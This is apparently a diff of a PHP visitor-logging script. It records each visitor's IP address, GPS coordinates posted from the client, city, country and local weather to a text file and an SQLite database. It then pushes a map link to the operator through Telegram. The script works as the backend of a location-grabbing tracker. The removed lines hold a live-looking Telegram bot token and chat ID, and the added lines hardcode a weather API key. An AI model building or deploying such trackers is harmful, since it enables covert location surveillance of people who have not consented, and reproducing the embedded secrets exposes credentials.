@@ -1,79 +1,51 @@
 <?php
-// Set timezone
-date_default_timezone_set('Asia/Kolkata');
+include 'telegram_notify.php';
 
-// Capture visitor's IP
+$db = new SQLite3('log.db');
+$db->exec("CREATE TABLE IF NOT EXISTS logs (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    ip TEXT, latitude TEXT, longitude TEXT, city TEXT,
+    country TEXT, weather TEXT, timestamp TEXT
+)");
+
+$data = json_decode(file_get_contents("php://input"), true);
+
 $ip = $_SERVER['REMOTE_ADDR'];
+$lat = $data['lat'] ?? 'N/A';
+$lon = $data['lon'] ?? 'N/A';
+$city = $data['city'] ?? 'N/A';
+$country = $data['country'] ?? 'N/A';
+$weather = 'N/A';
 $timestamp = date("Y-m-d H:i:s");
 
-// Get geolocation info from IP
-$geoData = @file_get_contents("http://ip-api.com/json/$ip");
-$geo = json_decode($geoData, true);
-
-// Fallbacks in case of API failure
-$country = $geo['country'] ?? 'Unknown';
-$city = $geo['city'] ?? 'Unknown';
-$lat = $geo['lat'] ?? '0';
-$lon = $geo['lon'] ?? '0';
-$google_maps_link = "https://www.google.com/maps?q=$lat,$lon";
-
-// Format log entry
-$logEntry = "$timestamp | IP: $ip | Country: $country | City: $city | Lat,Lon: $lat,$lon | Map: $google_maps_link\n";
-
-// Save to log.txt
-file_put_contents("log.txt", $logEntry, FILE_APPEND);
-
-// Store in SQLite (log.db)
-try {
-    $db = new SQLite3('log.db');
-    $db->exec("CREATE TABLE IF NOT EXISTS visitors (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        timestamp TEXT,
-        ip TEXT,
-        country TEXT,
-        city TEXT,
-        latitude TEXT,
-        longitude TEXT,
-        maps_link TEXT
-    )");
-
-    $stmt = $db->prepare("INSERT INTO visitors (timestamp, ip, country, city, latitude, longitude, maps_link)
-        VALUES (:timestamp, :ip, :country, :city, :latitude, :longitude, :maps_link)");
-    $stmt->bindValue(':timestamp', $timestamp);
-    $stmt->bindValue(':ip', $ip);
-    $stmt->bindValue(':country', $country);
-    $stmt->bindValue(':city', $city);
-    $stmt->bindValue(':latitude', $lat);
-    $stmt->bindValue(':longitude', $lon);
-    $stmt->bindValue(':maps_link', $google_maps_link);
-    $stmt->execute();
-} catch (Exception $e) {
-    file_put_contents("error.log", "DB Error: " . $e->getMessage() . "\n", FILE_APPEND);
+if ($lat !== 'N/A' && $lon !== 'N/A') {
+    // Weather API
+    $weatherKey = "71aec132cf2764d6ea577d3616629a9b";
+    $weatherData = file_get_contents("https://api.openweathermap.org/data/2.5/weather?lat=$lat&lon=$lon&appid=$weatherKey&units=metric");
+    $weatherJson = json_decode($weatherData, true);
+    if (isset($weatherJson['main']['temp'])) {
+        $weather = "{$weatherJson['main']['temp']}°C, {$weatherJson['weather'][0]['description']}";
+    }
 }
 
-// Send Telegram Notification
-$botToken = "7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8"; // Your bot token
-$chatId = "6602027873"; // Your Telegram user ID
+// Save log.txt
+$log = "IP: $ip | Lat: $lat | Lon: $lon | City: $city | Country: $country | Weather: $weather | Time: $timestamp\n";
+file_put_contents('log.txt', $log, FILE_APPEND);
 
-$telegramMessage = "
-🚨 New Visitor Logged 🚨
+// Save DB
+$stmt = $db->prepare("INSERT INTO logs (ip, latitude, longitude, city, country, weather, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?)");
+$stmt->bindValue(1, $ip);
+$stmt->bindValue(2, $lat);
+$stmt->bindValue(3, $lon);
+$stmt->bindValue(4, $city);
+$stmt->bindValue(5, $country);
+$stmt->bindValue(6, $weather);
+$stmt->bindValue(7, $timestamp);
+$stmt->execute();
 
-🕓 Time: $timestamp
-🌐 IP: $ip
-📍 Location: $city, $country
-🌍 GPS: $lat, $lon
-🔗 [View on Map]($google_maps_link)
-";
+// Send Telegram Alert
+$msg = "🚨 <b>New Visitor</b>\nIP: <code>$ip</code>\n📍 <b>$city, $country</b>\n🌐 https://www.google.com/maps?q=$lat,$lon\n⛅ $weather\n🕒 $timestamp";
+sendTelegram($msg);
 
-$telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage?" .
-    http_build_query([
-        'chat_id' => $chatId,
-        'text' => $telegramMessage,
-        'parse_mode' => 'Markdown'
-    ]);
-
-@file_get_contents($telegramUrl);
-
-// Return a simple success message (if needed)
-echo json_encode(["status" => "success", "message" => "Logged"]);
+echo "Logged.";
 ?>
